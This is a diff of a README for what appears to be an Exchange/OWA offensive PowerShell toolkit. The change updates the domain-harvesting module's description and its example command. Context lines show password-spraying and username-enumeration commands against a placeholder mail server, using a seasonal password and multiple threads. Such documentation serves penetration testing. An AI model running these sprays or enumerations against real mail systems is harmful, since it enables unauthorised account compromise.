@@ -83,9 +83,9 @@ Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -
 ```PowerShell
 Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
 ```
-**Invoke-DomainHarvestOWA** is a module that will attempt to connect to an Outlook Web Access portal and determine a valid domain name for logging into the portal based off of small timing differences in login attempts.
+**Invoke-DomainHarvestOWA** is a module that will attempt to connect to an Outlook Web Access portal and determine a valid domain name for logging into the portal from the WWW-Authenticate header returned in a web response from the server or based off of small timing differences in login attempts.
 ```PowerShell
-Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt
+Invoke-DomainHarvestOWA -ExchHostname mail.domain.com 
 ```
 **Invoke-UsernameHarvestOWA** is a module that will attempt to connect to an Outlook Web Access portal and harvest valid usernames based off of small timing differences in login attempts.
 ```PowerShell
